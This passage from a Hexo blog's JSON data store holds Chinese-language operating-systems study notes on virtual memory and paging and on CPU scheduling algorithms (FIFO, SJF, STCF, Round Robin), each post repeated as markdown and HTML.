没加载进内存，我也不知道它在哪，要怎麽去硬盘里找？</p>\n<p>那好吧，爲了做好映射关係，我们还要在进程运行时，给进程一张表，它负责进行内存和硬盘之间的关係。比如说，变量 B 的内存是 Ox11011，发现这在内存里不存在，那麽我们就去表上找，发现它在对应着内存里的 Ox00100，那麽我们就把内存里的那个 B 给它。</p>\n<p>但如果每一个变量，每个字都做映射，都要到硬盘里找，这实在是太麻类了。更重要的是，对硬盘做一次查询，所消耗的时间太长了，在 CPU 看来，每进行一次，都要花费 10 个月的时间。爲了省时省力，我们把程序分成多个部分，每一部分叫做一个虚拟页。同时，内存里也分成多个页，叫物理页。每一个物理页都可以容纳一个虚拟页。而映射它们的那张表，叫页表。</p>\n<p>现在我们来看看一个实例，虚拟地址是如何转换成物理地址的。</p>\n<p>一般而言，计算机是通过多级页表进行转换的，但爲了简单，这里就讨论只有一张页表的情况。</p>\n<p>现在设有 14 位的虚拟地址，要转换成 12 位的真实地址。其中，页表大小爲 64(2的6次方) B。</p>\n<ol>\n<li><p>通过虚拟地址位数和页大小，我们可以换算得到，共有 21426=256\\cfrac{2^{14}}{2^6}=25626214​=256 项。也就是说，要 8 位数才能表示完所有页(VPN)。那麽 14−8=614-8=614−8=6 来表示偏移量(VPO)。</p>\n</li>\n<li><p>由虚拟地址的偏移量，我们可以知道真实地址的偏移量。（两者相等）</p>\n</li>\n</ol>\n<p>比如下面，我们已知虚拟地址爲 00101100100010 （VPN(8) VPO(6)）</p>\n<p>那麽 00101100 爲虚拟页的首地址（页码）。100010 爲虚拟地址的偏移量。</p>\n<p>通过查页表，将 00101100 映射爲真实地址，假设爲 11010011，再加上偏移量 100010 得到真实地址 11010011100010.</p>\n<blockquote>\n<p>00101100100010 =&gt; 11010011100010</p>\n</blockquote>\n<p>到这里，地址转换就完成了！</p>\n<p>如果是多级页表，也只是通过多个 虚拟首地址（页码） 的转换而已。变成 VPN VPN VPN VPN … VPO。</p>\n<h2 id=\"它带来的好处\"><a href=\"#它带来的好处\" class=\"headerlink\" title=\"它带来的好处\"></a>它带来的好处</h2><p>简化链接、简化内存分配（不连续）、进程上的安全（不会干扰到其它进程）</p>\n<p>虚拟内存的出现，给我们带来了意想不到的好处。</p>\n<p>首先，它简化了链接过程。当程序编译完成时，程序里的每一个变量，每一个函数，还只是对应一个相对的地址，想要执行，还得有一个动态链接过程。由于虚拟页的存在，生成的可执行文件的地址可以独立于物理内存，这样设计链接器时，就简单得多。</p>\n<p>另外，因爲虚拟页与物理页之间是靠页表进行映射的，因此，一个进程的不周数据在物理内存里，可以不连续。毕竟查表就能知道它们的位置了，连不连续已经不重要了。于是，这样内存可以更动态，更轻鬆的进行分配。</p>\n<p>最后，可以虚拟化进程了。进程因爲页表的存在，不会存在相互干扰了。两个进程因爲页表与页表之间不同，映射到的地方不同，那怕虚拟地址相同，物理内存上也不会相同，它们之间彷彿有一道牆，阻止它们相互侵犯。</p>\n<h2 id=\"虚拟化\"><a href=\"#虚拟化\" class=\"headerlink\" title=\"虚拟化\"></a>虚拟化</h2><p>没错，地址也可以虚拟化。还有多少东西可以虚拟化呢？真的好期待啊。</p>\n","site":{"data":{}},"excerpt":"<h2 id=\"没有虚拟内存带来的问题\"><a href=\"#没有虚拟内存带来的问题\" class=\"headerlink\" title=\"没有虚拟内存带来的问题\"></a>没有虚拟内存带来的问题</h2><p>我们在运行程序时，总希望内存越大越好，这样可以运行的程序也可以越来越多，越来越大。但现实是，这样做是有很多成本的。最简单的成本就是钱。过去，爲了解决这个问题，人们写程序时，会考虑到内存大小，如果自己写的程序大过内存，那麽还要做一些工作，比如：想办法，只加载一部分代码，当有更多的需要时，再加载更多。</p>","more":"<p>这是一个相当有开创性的想法。这一想法在后来诞生了虚拟内存的伟大概念。（我瞎掰的）</p>\n<h2 id=\"虚拟内存的基本原理\"><a href=\"#虚拟内存的基本原理\" class=\"headerlink\" title=\"虚拟内存的基本原理\"></a>虚拟内存的基本原理</h2><p><img src=\"1566035265964.png\" alt=\"\"></p>\n<p>简单来说，当我们运行一个进程时，计算机并不会把整个程序都加载进内存里，而是放在硬盘上，当有需要时，再将加载需要的那一部分。</p>\n<p>那我们怎麽知道要加载哪一部分？比如说，我的下一条指令是到要变量 B，可是变量 B 没加载进内存，我也不知道它在哪，要怎麽去硬盘里找？</p>\n<p>那好吧，爲了做好映射关係，我们还要在进程运行时，给进程一张表，它负责进行内存和硬盘之间的关係。比如说，变量 B 的内存是 Ox11011，发现这在内存里不存在，那麽我们就去表上找，发现它在对应着内存里的 Ox00100，那麽我们就把内存里的那个 B 给它。</p>\n<p>但如果每一个变量，每个字都做映射，都要到硬盘里找，这实在是太麻类了。更重要的是，对硬盘做一次查询，所消耗的时间太长了，在 CPU 看来，每进行一次，都要花费 10 个月的时间。爲了省时省力，我们把程序分成多个部分，每一部分叫做一个虚拟页。同时，内存里也分成多个页，叫物理页。每一个物理页都可以容纳一个虚拟页。而映射它们的那张表，叫页表。</p>\n<p>现在我们来看看一个实例，虚拟地址是如何转换成物理地址的。</p>\n<p>一般而言，计算机是通过多级页表进行转换的，但爲了简单，这里就讨论只有一张页表的情况。</p>\n<p>现在设有 14 位的虚拟地址，要转换成 12 位的真实地址。其中，页表大小爲 64(2的6次方) B。</p>\n<ol>\n<li><p>通过虚拟地址位数和页大小，我们可以换算得到，共有 21426=256\\cfrac{2^{14}}{2^6}=25626214​=256 项。也就是说，要 8 位数才能表示完所有页(VPN)。那麽 14−8=614-8=614−8=6 来表示偏移量(VPO)。</p>\n</li>\n<li><p>由虚拟地址的偏移量，我们可以知道真实地址的偏移量。（两者相等）</p>\n</li>\n</ol>\n<p>比如下面，我们已知虚拟地址爲 00101100100010 （VPN(8) VPO(6)）</p>\n<p>那麽 00101100 爲虚拟页的首地址（页码）。100010 爲虚拟地址的偏移量。</p>\n<p>通过查页表，将 00101100 映射爲真实地址，假设爲 11010011，再加上偏移量 100010 得到真实地址 11010011100010.</p>\n<blockquote>\n<p>00101100100010 =&gt; 11010011100010</p>\n</blockquote>\n<p>到这里，地址转换就完成了！</p>\n<p>如果是多级页表，也只是通过多个 虚拟首地址（页码） 的转换而已。变成 VPN VPN VPN VPN … VPO。</p>\n<h2 id=\"它带来的好处\"><a href=\"#它带来的好处\" class=\"headerlink\" title=\"它带来的好处\"></a>它带来的好处</h2><p>简化链接、简化内存分配（不连续）、进程上的安全（不会干扰到其它进程）</p>\n<p>虚拟内存的出现，给我们带来了意想不到的好处。</p>\n<p>首先，它简化了链接过程。当程序编译完成时，程序里的每一个变量，每一个函数，还只是对应一个相对的地址，想要执行，还得有一个动态链接过程。由于虚拟页的存在，生成的可执行文件的地址可以独立于物理内存，这样设计链接器时，就简单得多。</p>\n<p>另外，因爲虚拟页与物理页之间是靠页表进行映射的，因此，一个进程的不周数据在物理内存里，可以不连续。毕竟查表就能知道它们的位置了，连不连续已经不重要了。于是，这样内存可以更动态，更轻鬆的进行分配。</p>\n<p>最后，可以虚拟化进程了。进程因爲页表的存在，不会存在相互干扰了。两个进程因爲页表与页表之间不同，映射到的地方不同，那怕虚拟地址相同，物理内存上也不会相同，它们之间彷彿有一道牆，阻止它们相互侵犯。</p>\n<h2 id=\"虚拟化\"><a href=\"#虚拟化\" class=\"headerlink\" title=\"虚拟化\"></a>虚拟化</h2><p>没错，地址也可以虚拟化。还有多少东西可以虚拟化呢？真的好期待啊。</p>"},{"title":"调度算法（一）","date":"2019-09-01T16:00:00.000Z","_content":"当进程虚拟化完成时，会自然遇到一个问题：我们该切换到哪一个进程？\n\n<!-- more -->\n\n人类做事情，可以依靠大脑自动完成任务的排序，比如，洗澡时，可以边想其它事边洗，可能洗完了都不知道自己刚才做了什麽。可计算机不一样，计算机很傻，它需要人来帮助它完成这一系列的安排，否则它不知道下一步该做什麽。\n\n爲什麽是这个进程，而不是那个进程？我们的计算器是依靠什麽来决定进程的切换？\n\n现在，是时候来好好回答一下这个问题。\n\n先从最简单的想法开始。\n\n## 先进先出队列 FIFO (First In Fisrt Out)\n\n假设同一时间里，有多个任务，那麽，谁先到队列就先执行谁，完成后再执行下一个。\n\n这个想法很像超市排队。实事上，这也是它被叫队列的原因，每一个任务都一样，不管你从哪里来，有什麽身份，都给我乖乖排队。\n\n## 最短的先来 SJF (Shortest Job First)\n\n可这有一点问题。虽然在计算机的眼中，这个队列怎麽排，总的运行时长是相同的，不会因爲 A 在 B 前，时间就比 B 在 A 前短。可任务不这麽想。\n\n还是在超市排队的例子。收营员压根不管谁在前谁在后，他只负责收营，在他眼中，整个队列的时长是一定的。\n\n但买东西的顾客就不一样了。顾客很在乎从排队开始到结算完的这段时长，因爲他们只看到了自己。每个人排了多久才完成结账的时间完全不同的。如果只有顾客 A 和 B 在排队。A 的东西要 10 分锺算完，B 要 5 分锺。如果 A 在 B 前结算，B 需要 15 分锺完成结账，反过来，B 在 A 前的话，B 只要 5 分锺就完成了。在 B 眼中，后者更高效。\n\n你可能会说，那麽 A 不也被拖慢了，我们就不管 A 的感受了吗？\n\n当然要管。爲此，我们应该有一个标准，来考察 B 排在 A 前比排在后，更结省每个客人的时间。\n\n我们设置一个量，称爲 Turnaroud Time。它用来描述每一个客人从排队到完成结算的时间。比如 A 排在 B 前，那麽对于 B，它的 Turnaroud Time 是 10+5 分锺。反过来排，这个值只有 5。我们可以计算一下两种排法的期望值。\n\n先是 A 排在 B 前。\n\n$10+152=12.5\\cfrac{10+15}{2} = 12.5 210+15​=12.5$\n\n然后反过来。\n\n$$5+152=10\\cfrac{5+15}{2} = 10 25+15​=10$$\n\n两个值并不一样！\n\n换而言之，两种不同的排法，对期望是有影响的。在尝试一下加入第三个客人 C，它需要 15 分锺才能算完。\n\n统计一下，不同排序对应的 Turnaroud Time 期望值。\n\n|排法|U(turnaround time)|\n|---|---|\n|A B C|18.333|\n|A C B|21.667|\n|B A C|16.667|\n|B C A|18.333|\n|C A B|23.333|\n|C B A|21.557|\n\n通过 6 种不同的排列，得到的 Turnaroud Time 值是不同的。最短的，是 B A C 的顺序。\n\n假设 B 排的是 x 分锺，对应 A 就是 2x 分锺，C 是 3x。\n\n最短的，B A C 的顺序中，B 花了 x，A 花了 x+2x，C 花了 x+2x+3x\n\n最长的，C A B 的顺序中，C 花了 3x，A 花了 3x+2x，B 花了 x+2x+3x\n\n可以发现：最后一个花的时间都是相同中的，不同的是前面的人。因爲第 i+1 人花的时间，总是要加上第 i 人的时间。第 i 人花的时间越少，第 i+1 人花的时间就越少。由此，我们可以得到一个重要的规则。\n\n> 最前面的任务，时长越短，Turnaroud Time 期望值越小\n\n下面两种排法显然不同\n\n![](1567392403118.png)\n\n![](1567392403168.png)\n\n\n","source":"_posts/调度算法（一）.md","raw":"---\ntitle: 调度算法（一）\ndate: 2019-09-02\ntags:\n---\n当进程虚拟化完成时，会自然遇到一个问题：我们该切换到哪一个进程？\n\n<!-- more -->\n\n人类做事情，可以依靠大脑自动完成任务的排序，比如，洗澡时，可以边想其它事边洗，可能洗完了都不知道自己刚才做了什麽。可计算机不一样，计算机很傻，它需要人来帮助它完成这一系列的安排，否则它不知道下一步该做什麽。\n\n爲什麽是这个进程，而不是那个进程？我们的计算器是依靠什麽来决定进程的切换？\n\n现在，是时候来好好回答一下这个问题。\n\n先从最简单的想法开始。\n\n## 先进先出队列 FIFO (First In Fisrt Out)\n\n假设同一时间里，有多个任务，那麽，谁先到队列就先执行谁，完成后再执行下一个。\n\n这个想法很像超市排队。实事上，这也是它被叫队列的原因，每一个任务都一样，不管你从哪里来，有什麽身份，都给我乖乖排队。\n\n## 最短的先来 SJF (Shortest Job First)\n\n可这有一点问题。虽然在计算机的眼中，这个队列怎麽排，总的运行时长是相同的，不会因爲 A 在 B 前，时间就比 B 在 A 前短。可任务不这麽想。\n\n还是在超市排队的例子。收营员压根不管谁在前谁在后，他只负责收营，在他眼中，整个队列的时长是一定的。\n\n但买东西的顾客就不一样了。顾客很在乎从排队开始到结算完的这段时长，因爲他们只看到了自己。每个人排了多久才完成结账的时间完全不同的。如果只有顾客 A 和 B 在排队。A 的东西要 10 分锺算完，B 要 5 分锺。如果 A 在 B 前结算，B 需要 15 分锺完成结账，反过来，B 在 A 前的话，B 只要 5 分锺就完成了。在 B 眼中，后者更高效。\n\n你可能会说，那麽 A 不也被拖慢了，我们就不管 A 的感受了吗？\n\n当然要管。爲此，我们应该有一个标准，来考察 B 排在 A 前比排在后，更结省每个客人的时间。\n\n我们设置一个量，称爲 Turnaroud Time。它用来描述每一个客人从排队到完成结算的时间。比如 A 排在 B 前，那麽对于 B，它的 Turnaroud Time 是 10+5 分锺。反过来排，这个值只有 5。我们可以计算一下两种排法的期望值。\n\n先是 A 排在 B 前。\n\n$10+152=12.5\\cfrac{10+15}{2} = 12.5 210+15​=12.5$\n\n然后反过来。\n\n$$5+152=10\\cfrac{5+15}{2} = 10 25+15​=10$$\n\n两个值并不一样！\n\n换而言之，两种不同的排法，对期望是有影响的。在尝试一下加入第三个客人 C，它需要 15 分锺才能算完。\n\n统计一下，不同排序对应的 Turnaroud Time 期望值。\n\n|排法|U(turnaround time)|\n|---|---|\n|A B C|18.333|\n|A C B|21.667|\n|B A C|16.667|\n|B C A|18.333|\n|C A B|23.333|\n|C B A|21.557|\n\n通过 6 种不同的排列，得到的 Turnaroud Time 值是不同的。最短的，是 B A C 的顺序。\n\n假设 B 排的是 x 分锺，对应 A 就是 2x 分锺，C 是 3x。\n\n最短的，B A C 的顺序中，B 花了 x，A 花了 x+2x，C 花了 x+2x+3x\n\n最长的，C A B 的顺序中，C 花了 3x，A 花了 3x+2x，B 花了 x+2x+3x\n\n可以发现：最后一个花的时间都是相同中的，不同的是前面的人。因爲第 i+1 人花的时间，总是要加上第 i 人的时间。第 i 人花的时间越少，第 i+1 人花的时间就越少。由此，我们可以得到一个重要的规则。\n\n> 最前面的任务，时长越短，Turnaroud Time 期望值越小\n\n下面两种排法显然不同\n\n![](1567392403118.png)\n\n![](1567392403168.png)\n\n\n","slug":"调度算法（一）","published":1,"updated":"2020-03-07T08:01:13.203Z","_id":"ck7h7mt5b0005633xh88pd6nm","comments":1,"layout":"post","photos":[],"link":"","content":"<p>当进程虚拟化完成时，会自然遇到一个问题：我们该切换到哪一个进程？</p>\n<a id=\"more\"></a>\n\n<p>人类做事情，可以依靠大脑自动完成任务的排序，比如，洗澡时，可以边想其它事边洗，可能洗完了都不知道自己刚才做了什麽。可计算机不一样，计算机很傻，它需要人来帮助它完成这一系列的安排，否则它不知道下一步该做什麽。</p>\n<p>爲什麽是这个进程，而不是那个进程？我们的计算器是依靠什麽来决定进程的切换？</p>\n<p>现在，是时候来好好回答一下这个问题。</p>\n<p>先从最简单的想法开始。</p>\n<h2 id=\"先进先出队列-FIFO-First-In-Fisrt-Out\"><a href=\"#先进先出队列-FIFO-First-In-Fisrt-Out\" class=\"headerlink\" title=\"先进先出队列 FIFO (First In Fisrt Out)\"></a>先进先出队列 FIFO (First In Fisrt Out)</h2><p>假设同一时间里，有多个任务，那麽，谁先到队列就先执行谁，完成后再执行下一个。</p>\n<p>这个想法很像超市排队。实事上，这也是它被叫队列的原因，每一个任务都一样，不管你从哪里来，有什麽身份，都给我乖乖排队。</p>\n<h2 id=\"最短的先来-SJF-Shortest-Job-First\"><a href=\"#最短的先来-SJF-Shortest-Job-First\" class=\"headerlink\" title=\"最短的先来 SJF (Shortest Job First)\"></a>最短的先来 SJF (Shortest Job First)</h2><p>可这有一点问题。虽然在计算机的眼中，这个队列怎麽排，总的运行时长是相同的，不会因爲 A 在 B 前，时间就比 B 在 A 前短。可任务不这麽想。</p>\n<p>还是在超市排队的例子。收营员压根不管谁在前谁在后，他只负责收营，在他眼中，整个队列的时长是一定的。</p>\n<p>但买东西的顾客就不一样了。顾客很在乎从排队开始到结算完的这段时长，因爲他们只看到了自己。每个人排了多久才完成结账的时间完全不同的。如果只有顾客 A 和 B 在排队。A 的东西要 10 分锺算完，B 要 5 分锺。如果 A 在 B 前结算，B 需要 15 分锺完成结账，反过来，B 在 A 前的话，B 只要 5 分锺就完成了。在 B 眼中，后者更高效。</p>\n<p>你可能会说，那麽 A 不也被拖慢了，我们就不管 A 的感受了吗？</p>\n<p>当然要管。爲此，我们应该有一个标准，来考察 B 排在 A 前比排在后，更结省每个客人的时间。</p>\n<p>我们设置一个量，称爲 Turnaroud Time。它用来描述每一个客人从排队到完成结算的时间。比如 A 排在 B 前，那麽对于 B，它的 Turnaroud Time 是 10+5 分锺。反过来排，这个值只有 5。我们可以计算一下两种排法的期望值。</p>\n<p>先是 A 排在 B 前。</p>\n<p>$10+152=12.5\\cfrac{10+15}{2} = 12.5 210+15​=12.5$</p>\n<p>然后反过来。</p>\n<p>$$5+152=10\\cfrac{5+15}{2} = 10 25+15​=10$$</p>\n<p>两个值并不一样！</p>\n<p>换而言之，两种不同的排法，对期望是有影响的。在尝试一下加入第三个客人 C，它需要 15 分锺才能算完。</p>\n<p>统计一下，不同排序对应的 Turnaroud Time 期望值。</p>\n<table>\n<thead>\n<tr>\n<th>排法</th>\n<th>U(turnaround time)</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>A B C</td>\n<td>18.333</td>\n</tr>\n<tr>\n<td>A C B</td>\n<td>21.667</td>\n</tr>\n<tr>\n<td>B A C</td>\n<td>16.667</td>\n</tr>\n<tr>\n<td>B C A</td>\n<td>18.333</td>\n</tr>\n<tr>\n<td>C A B</td>\n<td>23.333</td>\n</tr>\n<tr>\n<td>C B A</td>\n<td>21.557</td>\n</tr>\n</tbody></table>\n<p>通过 6 种不同的排列，得到的 Turnaroud Time 值是不同的。最短的，是 B A C 的顺序。</p>\n<p>假设 B 排的是 x 分锺，对应 A 就是 2x 分锺，C 是 3x。</p>\n<p>最短的，B A C 的顺序中，B 花了 x，A 花了 x+2x，C 花了 x+2x+3x</p>\n<p>最长的，C A B 的顺序中，C 花了 3x，A 花了 3x+2x，B 花了 x+2x+3x</p>\n<p>可以发现：最后一个花的时间都是相同中的，不同的是前面的人。因爲第 i+1 人花的时间，总是要加上第 i 人的时间。第 i 人花的时间越少，第 i+1 人花的时间就越少。由此，我们可以得到一个重要的规则。</p>\n<blockquote>\n<p>最前面的任务，时长越短，Turnaroud Time 期望值越小</p>\n</blockquote>\n<p>下面两种排法显然不同</p>\n<p><img src=\"1567392403118.png\" alt=\"\"></p>\n<p><img src=\"1567392403168.png\" alt=\"\"></p>\n","site":{"data":{}},"excerpt":"<p>当进程虚拟化完成时，会自然遇到一个问题：我们该切换到哪一个进程？</p>","more":"<p>人类做事情，可以依靠大脑自动完成任务的排序，比如，洗澡时，可以边想其它事边洗，可能洗完了都不知道自己刚才做了什麽。可计算机不一样，计算机很傻，它需要人来帮助它完成这一系列的安排，否则它不知道下一步该做什麽。</p>\n<p>爲什麽是这个进程，而不是那个进程？我们的计算器是依靠什麽来决定进程的切换？</p>\n<p>现在，是时候来好好回答一下这个问题。</p>\n<p>先从最简单的想法开始。</p>\n<h2 id=\"先进先出队列-FIFO-First-In-Fisrt-Out\"><a href=\"#先进先出队列-FIFO-First-In-Fisrt-Out\" class=\"headerlink\" title=\"先进先出队列 FIFO (First In Fisrt Out)\"></a>先进先出队列 FIFO (First In Fisrt Out)</h2><p>假设同一时间里，有多个任务，那麽，谁先到队列就先执行谁，完成后再执行下一个。</p>\n<p>这个想法很像超市排队。实事上，这也是它被叫队列的原因，每一个任务都一样，不管你从哪里来，有什麽身份，都给我乖乖排队。</p>\n<h2 id=\"最短的先来-SJF-Shortest-Job-First\"><a href=\"#最短的先来-SJF-Shortest-Job-First\" class=\"headerlink\" title=\"最短的先来 SJF (Shortest Job First)\"></a>最短的先来 SJF (Shortest Job First)</h2><p>可这有一点问题。虽然在计算机的眼中，这个队列怎麽排，总的运行时长是相同的，不会因爲 A 在 B 前，时间就比 B 在 A 前短。可任务不这麽想。</p>\n<p>还是在超市排队的例子。收营员压根不管谁在前谁在后，他只负责收营，在他眼中，整个队列的时长是一定的。</p>\n<p>但买东西的顾客就不一样了。顾客很在乎从排队开始到结算完的这段时长，因爲他们只看到了自己。每个人排了多久才完成结账的时间完全不同的。如果只有顾客 A 和 B 在排队。A 的东西要 10 分锺算完，B 要 5 分锺。如果 A 在 B 前结算，B 需要 15 分锺完成结账，反过来，B 在 A 前的话，B 只要 5 分锺就完成了。在 B 眼中，后者更高效。</p>\n<p>你可能会说，那麽 A 不也被拖慢了，我们就不管 A 的感受了吗？</p>\n<p>当然要管。爲此，我们应该有一个标准，来考察 B 排在 A 前比排在后，更结省每个客人的时间。</p>\n<p>我们设置一个量，称爲 Turnaroud Time。它用来描述每一个客人从排队到完成结算的时间。比如 A 排在 B 前，那麽对于 B，它的 Turnaroud Time 是 10+5 分锺。反过来排，这个值只有 5。我们可以计算一下两种排法的期望值。</p>\n<p>先是 A 排在 B 前。</p>\n<p>$10+152=12.5\\cfrac{10+15}{2} = 12.5 210+15​=12.5$</p>\n<p>然后反过来。</p>\n<p>$$5+152=10\\cfrac{5+15}{2} = 10 25+15​=10$$</p>\n<p>两个值并不一样！</p>\n<p>换而言之，两种不同的排法，对期望是有影响的。在尝试一下加入第三个客人 C，它需要 15 分锺才能算完。</p>\n<p>统计一下，不同排序对应的 Turnaroud Time 期望值。</p>\n<table>\n<thead>\n<tr>\n<th>排法</th>\n<th>U(turnaround time)</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>A B C</td>\n<td>18.333</td>\n</tr>\n<tr>\n<td>A C B</td>\n<td>21.667</td>\n</tr>\n<tr>\n<td>B A C</td>\n<td>16.667</td>\n</tr>\n<tr>\n<td>B C A</td>\n<td>18.333</td>\n</tr>\n<tr>\n<td>C A B</td>\n<td>23.333</td>\n</tr>\n<tr>\n<td>C B A</td>\n<td>21.557</td>\n</tr>\n</tbody></table>\n<p>通过 6 种不同的排列，得到的 Turnaroud Time 值是不同的。最短的，是 B A C 的顺序。</p>\n<p>假设 B 排的是 x 分锺，对应 A 就是 2x 分锺，C 是 3x。</p>\n<p>最短的，B A C 的顺序中，B 花了 x，A 花了 x+2x，C 花了 x+2x+3x</p>\n<p>最长的，C A B 的顺序中，C 花了 3x，A 花了 3x+2x，B 花了 x+2x+3x</p>\n<p>可以发现：最后一个花的时间都是相同中的，不同的是前面的人。因爲第 i+1 人花的时间，总是要加上第 i 人的时间。第 i 人花的时间越少，第 i+1 人花的时间就越少。由此，我们可以得到一个重要的规则。</p>\n<blockquote>\n<p>最前面的任务，时长越短，Turnaroud Time 期望值越小</p>\n</blockquote>\n<p>下面两种排法显然不同</p>\n<p><img src=\"1567392403118.png\" alt=\"\"></p>\n<p><img src=\"1567392403168.png\" alt=\"\"></p>"},{"title":"调度算法（二）","date":"2019-09-07T16:00:00.000Z","_content":"说完 SJF 算法，我们再来看看一个新的问题。\n\n如果，所有的任务并不是同时进入队列怎麽办？\n\n<!-- more -->\n\nSJF 算法之所以成立，很重要的一点是：我们知道队列里所有 job，并且比较了它们。假如，哪怕是 1s，两个任务先后进入了队列，我们的 CPU 可能就无法比较它们，然后找出最短的 job，SJF 算法也就崩分离析，变回了 FIFO。\n\n爲了解决这个问题，我们在 SJF 的高度上，再做一点修改。\n\n## 最先能完成的先来 STCF (Short Time-to-Completion First)\n\n前面的两个算法，无论是 FIFO 还是 SJF 都是按顺序执行的，也就是说，队列前面的 job 没完成，是不能执行后面的 job。\n\n这点有点违背现实。我们煮水时，是不会等水煮完再去洗杯子，而应该是等水开的时间里去洗。虽然这个例子并不适用于我们要说的这个算法，但理念是相同的：我们可以中断任务，然后执行其它任务。\n\n现在任务 A 是 100s 完成，B 是 10s 完成。还是最开始的问题：如果两个 job 先后进入队列里，应该怎麽办？\n\n在 SJF 里，如果 B 先进那还好，A 先进入的话，就出问题了。因爲 A 进入时，队列里还没有任何 job，那麽 CPU 理所当然的认爲 A 是最短的任务，然后执行它。这时候再进入 B，已经是执行 A 之后的事了，B 只能乖乖等 A 执行完。那麽 Turnaroud Time 平均时间和 FIFO 是完全一样的。\n\n$ 100+1102=105s\\cfrac{100+110}{2} = 105 s 2100+110​=105s $\n\n换成 STCF，如果 A 先后进入队列里，B 在进入，会发生什麽？首先，在 B 进来之前，A 是最短可完成的 job。在执行 1s 之后，队列 B 进来了。队列一看，发现 B 才是最短可完成的 job。于是 CPU 会中断，(关于 job 之前的切换，以后再提)然后换成执行 B，等 B 完成之后，再执行 A。\n\n$ 10+10+1002=60s\\cfrac{10+10+100}{2} = 60 s 210+10+100​=60s $\n\n减少近一半的时间。所以，这麽优化是值得的。这几乎是我们能想到，最优的算法了吧？\n\n## RR（Round Robin）\n\n如果之满足于 Turnaroud Time ,那麽我们的任务应该在 STCF 提出时就结束了。但我们不能只满足于 Turnaroud Time 。\n\n假想，如果有三个 job，每一 job 都要花 1000s，在第一个 job 完成之前，你得等到 1000s 之后，才能看到第二个 job 开始工作。天！我想要知道自己输进去的式子有没有问题，必须等到 1000s 后，才能看到第一次运行！响应太慢了！\n\n能想到最简单的办法，就是加快 STCF 的切换过程。比如，A 执行几秒，B 执行几秒，这样不停的切换就好了。这也是 Round Robin 算法的核心。\n\n不过，如果这样的法，STCF 的关键**最短可完成**就没了，同时，频繁切换进程也会产生很大的花销，切换得越快，花销就越多，这样是否值得？换而言之，我们 STCF 算法依然不是我们想要的，最优的，算法。\n\n---\n\n## 最关键的问题\n\n我们要找到一个算法，它的 *Turnaroud Time* 期望最小，同时，还要很快的响应。这才是我们的目标。\n\n还有，我们还要解决从最开始就设下的，绝对不可以忽视的，上面所有算法的根基条件。破坏这个条件，也意味着，上面的一切算法将会轰然倒塌，那就是：我们无法知道任务的运行时间。\n","source":"_posts/调度算法（二）.md","raw":"---\ntitle: 调度算法（二）\ndate: 2019-09-08\ntags:\n---\n说完 SJF 算法，我们再来看看一个新的问题。\n\n如果，所有的任务并不是同时进入队列怎麽办？\n\n<!-- more -->\n\nSJF 算法之所以成立，很重要的一点是：我们知道队列里所有 job，并且比较了它们。假如，哪怕是 1s，两个任务先后进入了队列，我们的 CPU 可能就无法比较它们，然后找出最短的 job，SJF 算法也就崩分离析，变回了 FIFO。\n\n爲了解决这个问题，我们在 SJF 的高度上，再做一点修改。\n\n## 最先能完成的先来 STCF (Short Time-to-Completion First)\n\n前面的两个算法，无论是 FIFO 还是 SJF 都是按顺序执行的，也就是说，队列前面的 job 没完成，是不能执行后面的 job。\n\n这点有点违背现实。我们煮水时，是不会等水煮完再去洗杯子，而应该是等水开的时间里去洗。虽然这个例子并不适用于我们要说的这个算法，但理念是相同的：我们可以中断任务，然后执行其它任务。\n\n现在任务 A 是 100s 完成，B 是 10s 完成。还是最开始的问题：如果两个 job 先后进入队列里，应该怎麽办？\n\n在 SJF 里，如果 B 先进那还好，A 先进入的话，就出问题了。因爲 A 进入时，队列里还没有任何 job，那麽 CPU 理所当然的认爲 A 是最短的任务，然后执行它。这时候再进入 B，已经是执行 A 之后的事了，B 只能乖乖等 A 执行完。那麽 Turnaroud Time 平均时间和 FIFO 是完全一样的。\n\n$ 100+1102=105s\\cfrac{100+110}{2} = 105 s 2100+110​=105s $\n\n换成 STCF，如果 A 先后进入队列里，B 在进入，会发生什麽？首先，在 B 进来之前，A 是最短可完成的 job。在执行 1s 之后，队列 B 进来了。队列一看，发现 B 才是最短可完成的 job。于是 CPU 会中断，(关于 job 之前的切换，以后再提)然后换成执行 B，等 B 完成之后，再执行 A。\n\n$ 10+10+1002=60s\\cfrac{10+10+100}{2} = 60 s 210+10+100​=60s $\n\n减少近一半的时间。所以，这麽优化是值得的。这几乎是我们能想到，最优的算法了吧？\n\n## RR（Round Robin）\n\n如果之满足于 Turnaroud Time ,那麽我们的任务应该在 STCF 提出时就结束了。但我们不能只满足于 Turnaroud Time 。\n\n假想，如果有三个 job，每一 job 都要花 1000s，在第一个 job 完成之前，你得等到 1000s 之后，才能看到第二个 job 开始工作。天！我想要知道自己输进去的式子有没有问题，必须等到 1000s 后，才能看到第一次运行！响应太慢了！\n\n能想到最简单的办法，就是加快 STCF 的切换过程。比如，A 执行几秒，B 执行几秒，这样不停的切换就好了。这也是 Round Robin 算法的核心。\n\n不过，如果这样的法，STCF 的关键**最短可完成**就没了，同时，频繁切换进程也会产生很大的花销，切换得越快，花销就越多，这样是否值得？换而言之，我们 STCF 算法依然不是我们想要的，最优的，算法。\n\n---\n\n## 最关键的问题\n\n我们要找到一个算法，它的 *Turnaroud Time* 期望最小，同时，还要很快的响应。这才是我们的目标。\n\n还有，我们还要解决从最开始就设下的，绝对不可以忽视的，上面所有算法的根基条件。破坏这个条件，也意味着，上面的一切算法将会轰然倒塌，那就是：我们无法知道任务的运行时间。\n","slug":"调度算法（二）","published":1,"updated":"2020-03-07T08:01:04.228Z","_id":"ck7h7ugtq0006633x4ogqai4k","comments":1,"layout":"post","photos":[],"link":"","content":"<p>说完 SJF 算法，我们再来看看一个新的问题。</p>\n<p>如果，所有的任务并不是同时进入队列怎麽办？</p>\n<a id=\"more\"></a>\n\n<p>SJF 算法之所以成立，很重要的一点是：我们知道队列里所有 job，并且比较了它们。假如，哪怕是 1s，两个任务先后进入了队列，我们的 CPU 可能就无法比较它们，然后找出最短的 job，SJF 算法也就崩分离析，变回了 FIFO。</p>\n<p>爲了解决这个问题，我们在 SJF 的高度上，再做一点修改。</p>\n<h2 id=\"最先能完成的先来-STCF-Short-Time-to-Completion-First\"><a href=\"#最先能完成的先来-STCF-Short-Time-to-Completion-First\" class=\"headerlink\" title=\"最先能完成的先来 STCF (Short Time-to-Completion First)\"></a>最先能完成的先来 STCF (Short Time-to-Completion First)</h2><p>前面的两个算法，无论是 FIFO 还是 SJF 都是按顺序执行的，也就是说，队列前面的 job 没完成，是不能执行后面的 